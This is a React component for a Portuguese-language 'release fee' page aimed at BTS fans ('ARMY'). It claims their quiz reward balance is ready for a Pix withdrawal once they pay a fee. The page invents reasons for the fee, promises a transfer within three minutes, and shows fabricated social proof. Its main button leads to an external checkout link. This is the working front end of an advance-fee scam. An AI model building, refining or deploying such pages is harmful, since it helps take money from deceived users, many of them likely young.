
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Shield, Lock, Briefcase, Lightbulb, MapPin, Gift, CheckCircle } from 'lucide-react';

interface TaxaLiberacaoProps {
  score: number;
  pixKey: string;
  onPayment: () => void;
}

const TaxaLiberacao = ({
  score,
  pixKey,
  onPayment
}: TaxaLiberacaoProps) => {
  const handlePayment = () => {
    onPayment();
  };

  return <div className="min-h-screen bg-gradient-to-br from-purple-900 via-purple-800 to-pink-800 flex flex-col p-4 overflow-y-auto">
      <div className="max-w-2xl mx-auto w-full space-y-6 py-6">
        
        {/* Header */}
        <Card className="border-2 border-yellow-400 shadow-2xl">
          <CardHeader className="bg-gradient-to-r from-yellow-400 to-yellow-500 p-4">
            <CardTitle className="text-center text-xl font-bold text-gray-800">🚨ATENÇÃO🚨</CardTitle>
          </CardHeader>
          <CardContent className="p-6 text-center">
            <h2 className="font-bold text-purple-800 mb-4 text-xl">ÚLTIMA ETAPA</h2>
            
            <p className="text-gray-700 text-lg mb-4">
              Seu saldo de <span className="font-bold text-green-600">R${score},00</span> está pronto para ser resgatado via Pix.
            </p>
            
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
              <p className="text-blue-800 text-sm">
                ✅ Para sacar sua recompensa, é necessário fazer um cadastro rápido no nosso aplicativo oficial Clube ARMY e baixá-lo no seu celular.
                📲 Dentro do app, você poderá solicitar o saque do seu saldo via Pix com segurança, <span className="font-bold">acompanhar seu histórico e continuar respondendo perguntas todos os dias para acumular ainda mais recompensas!</span>
                💜 Essa é a maneira oficial de validar sua conta, evitar fraudes e garantir que apenas verdadeiros fãs participem do clube.
            </div>
          </CardContent>
        </Card>

        {/* Informações da Taxa */}
        <Card className="border border-gray-300 shadow-lg">
          <CardContent className="p-6">
            <h3 className="text-lg font-bold text-gray-800 mb-4">Essa taxa serve para:</h3>
            
            <div className="space-y-3 mb-6">
              <div className="flex items-start space-x-3">
                <Lock className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
                <p className="text-gray-700 text-sm">Garantir que o CPF/Chave Pix usada é válida</p>
              </div>
              
              <div className="flex items-start space-x-3">
                <Shield className="w-5 h-5 text-green-600 mt-0.5 flex-shrink-0" />
                <p className="text-gray-700 text-sm">Proteger o sistema contra bots, fraudes e múltiplos saques falsos</p>
              </div>
              
              <div className="flex items-start space-x-3">
                <Briefcase className="w-5 h-5 text-purple-600 mt-0.5 flex-shrink-0" />
                <p className="text-gray-700 text-sm">Cobrir os custos de transação e operação da plataforma</p>
              </div>
            </div>

            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-4">
              <div className="flex items-start space-x-2">
                <Lightbulb className="w-5 h-5 text-yellow-600 mt-0.5 flex-shrink-0" />
                <div>
                  <p className="font-bold text-yellow-800 text-sm mb-1">💡 Importante:</p>
                  <p className="text-yellow-700 text-sm">Após o pagamento, sua chave Pix será vinculada automaticamente ao seu saldo e o valor será transferido em até 3 minutos.</p>
                </div>
              </div>
            </div>

            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
              <div className="flex items-start space-x-2">
                <MapPin className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
                <p className="text-blue-800 text-sm">
                  📌 Esse procedimento existe para manter a plataforma 100% segura e funcional para todos os participantes.
                </p>
              </div>
            </div>

            <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
              <div className="flex items-start space-x-2">
                <Gift className="w-5 h-5 text-green-600 mt-0.5 flex-shrink-0" />
                <p className="text-green-800 text-sm font-medium">
                  🎁 Você chegou até aqui com mérito. Agora é só confirmar sua identidade e receber seu premio!
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Botão de Pagamento */}
        <Card className="border-2 border-green-400 shadow-xl">
          <CardContent className="p-6">
            <Button onClick={() => window.location.href = 'https://checkout.viperpay.com.br/TpDmjqoT'} className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-4 text-lg shadow-lg mb-4 text-center">
              LIBERAR O SAQUE AGORA
            </Button>            
            <div className="text-center text-sm text-gray-600 mb-4">
              Clique no botão acima para continuar seu saque.
            </div>
            
            <div className="bg-green-50 border border-green-200 rounded-lg p-3 text-center">
              <div className="flex items-center justify-center space-x-2">
                <CheckCircle className="w-4 h-4 text-green-600" />
                <p className="text-green-700 text-sm font-medium">Você não está sozinha: 23 ARMYs já resgataram sua recompensa hoje!</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>;
};

export default TaxaLiberacao;
